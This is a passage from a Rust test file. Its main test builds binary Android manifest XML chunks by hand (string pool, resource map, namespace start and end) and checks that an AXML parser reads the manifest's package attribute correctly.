        let fallback = tmp_path.join(".local/share");
        assert_eq!(DesktopIntegration::get_data_dir(), fallback);
    });
}

#[test]
fn test_namespace_and_resource_map_skipping() {
    // Binary XML with Resource Map (0x0180) and Namespaces (0x0100 / 0x0101) must parse cleanly
    let strings = vec![
        "manifest",
        "package",
        "org.test.namespaces",
        "android",
        "http://schemas.android.com/apk/res/android",
    ];

    let sp_buf = build_string_pool_utf16(&strings);

    // Resource Map chunk (0x0180) with 2 resource IDs
    let mut res_map_chunk = Vec::new();
    res_map_chunk.write_u32::<LittleEndian>(0x00080180).unwrap(); // CHUNK_RES_MAP (type 0x0180, header 8)
    res_map_chunk.write_u32::<LittleEndian>(16).unwrap(); // chunk size: 8 + 8 = 16
    res_map_chunk.write_u32::<LittleEndian>(0x01010001).unwrap();
    res_map_chunk.write_u32::<LittleEndian>(0x01010002).unwrap();

    // Start Namespace chunk (0x0100)
    let mut start_ns_chunk = Vec::new();
    start_ns_chunk.write_u32::<LittleEndian>(0x00100100).unwrap(); // CHUNK_START_NS (type 0x0100, header 16)
    start_ns_chunk.write_u32::<LittleEndian>(24).unwrap(); // chunk size
    start_ns_chunk.write_u32::<LittleEndian>(1).unwrap(); // line number
    start_ns_chunk.write_u32::<LittleEndian>(0xFFFFFFFF).unwrap(); // comment
    start_ns_chunk.write_u32::<LittleEndian>(3).unwrap(); // prefix idx: "android"
    start_ns_chunk.write_u32::<LittleEndian>(4).unwrap(); // uri idx: "http://schemas..."

    // Manifest tag
    let manifest_start = build_start_tag(0, &[(4, 1, 2, 0x03, 2)]); // package="org.test.namespaces"
    let manifest_end = build_end_tag(0);

    // End Namespace chunk (0x0101)
    let mut end_ns_chunk = Vec::new();
    end_ns_chunk.write_u32::<LittleEndian>(0x00100101).unwrap(); // CHUNK_END_NS (type 0x0101, header 16)
    end_ns_chunk.write_u32::<LittleEndian>(24).unwrap(); // chunk size
    end_ns_chunk.write_u32::<LittleEndian>(1).unwrap();
    end_ns_chunk.write_u32::<LittleEndian>(0xFFFFFFFF).unwrap();
    end_ns_chunk.write_u32::<LittleEndian>(3).unwrap(); // prefix
    end_ns_chunk.write_u32::<LittleEndian>(4).unwrap(); // uri

    let axml_bytes = build_axml_from_chunks(&[
        sp_buf,
        res_map_chunk,
        start_ns_chunk,
        manifest_start,
        manifest_end,
        end_ns_chunk,
    ]);

    let mut parser = AxmlParser::new(&axml_bytes);
    let root = parser.parse().expect("AXML with resource map and namespaces should parse cleanly");
    let sp = parser.string_pool();

    assert_eq!(root.name, "manifest");
    assert_eq!(
        root.get_attr("package", sp).as_deref(),
        Some("org.test.namespaces")
    );
}
